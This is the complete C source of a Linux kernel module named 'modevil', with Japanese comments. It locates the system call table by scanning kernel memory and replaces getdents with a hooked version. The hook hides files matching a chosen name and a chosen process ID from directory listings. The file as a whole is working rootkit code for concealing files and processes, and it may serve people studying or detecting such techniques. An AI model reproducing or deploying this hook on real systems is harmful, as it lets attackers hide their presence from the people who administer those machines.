#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/sched.h>

MODULE_AUTHOR("ptr-yudai");
MODULE_DESCRIPTION("Hook getdents syscall");

void **sys_call_table;

struct linux_dirent {
  unsigned long  d_ino;
  unsigned long  d_off;
  unsigned short d_reclen;
  char           d_name[1];
};

static int pid = 0;
static char *filename = "!filename!";
module_param(pid, int, 0);
MODULE_PARM_DESC(pid, "Process ID to hide");
module_param(filename, charp, S_IRUGO | S_IWUSR);
MODULE_PARM_DESC(filename, "Filename to hide");

// 古いgetdentsのアドレス
asmlinkage long (*original_getdents)
(unsigned int, struct linux_dirent*, unsigned int);

/*
 * オリジナルatoi
 * PID用なので負数には非対応
 */
int myatoi(char *str) {
    int num = 0;
    while(*str != '\0') {
      if (*str < '0' || *str > '9') {
	return -1;
      }
      num += *str - '0';
      num *= 10;
      str++;
    }
    num /= 10;
    return num;
}

// 新しいgetdentsの宣言
asmlinkage long hacked_getdents(
				unsigned int fd,
				struct linux_dirent *dirp,
				unsigned int count
				)
{
  long res;
  char *ptr = (char*)dirp;
  struct linux_dirent *curr;
  char *src, *dst;
  long len;

  //printk(KERN_INFO "modevil: Hacked getdents is called!\n");

  res = (*original_getdents)(fd, dirp, count);
  
  // 失敗したらそのまま終了
  if ((!res) || (res == -1)) {
    return res;
  }
  
  while(ptr < (char *)dirp + res) {
    curr = (struct linux_dirent *)ptr;
    // 1. modevilを含むファイルは表示しない
    // 2. pidの数字が名前のファイルは表示しない
    if (strstr(curr->d_name, filename) != NULL ||
	myatoi(curr->d_name) == pid) {
      printk(KERN_INFO "modevil: Found target!\n");
      // 全体のサイズからこのエントリを減算
      res -= curr->d_reclen;
      // それ以降のエントリを詰める
      src = ptr + curr->d_reclen;
      dst = ptr;
      for(len = res; len > 0; --len) {
	*(dst++) = *(src++);
      }
      continue;
    }

    // 次のエントリへ
    ptr += curr->d_reclen;
  }

  return res;
}

/*
 * sys_call_tableのアドレスを探す
 */
static unsigned long **find_sys_call_table(void)
{
  unsigned long offset;
  unsigned long **sct;
  
  // PAGE_OFFSETから探索
  for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
    // 仮にoffsetがsys_call_tableの先頭だとする
    sct = (unsigned long**)offset;
    // __NR_close番目のポインタがsys_closeであれば一致
    if(sct[__NR_close] == (unsigned long*) sys_close) {
      printk(KERN_INFO "modevil: Found sys_call_table at 0x%lx", (unsigned long)sct);
      return sct;
    }
  }
  
  printk(KERN_INFO "modevil: Found nothing");
  return NULL;
}

/*
 * システムコールエントリを変更
 */
void modify_syscall(void)
{
  // sys_call_tableのアドレスを取得
  sys_call_table = (void**)find_sys_call_table();
  // 元のgetdentsを保持
  original_getdents = sys_call_table[__NR_getdents];
  // 新しいgetdentsに変更
  sys_call_table[__NR_getdents] = hacked_getdents;
}

/*
 * モジュール初期化
 */
int init_module(void)
{
  printk(KERN_INFO "modevil: Hello!\n");

  modify_syscall();
  
  return 0;
}

/*
 * モジュール解放
 */
void cleanup_module(void)
{
  printk(KERN_INFO "modevil: See you!\n");

  // 変更を元に戻す
  sys_call_table[__NR_getdents] = original_getdents;
}
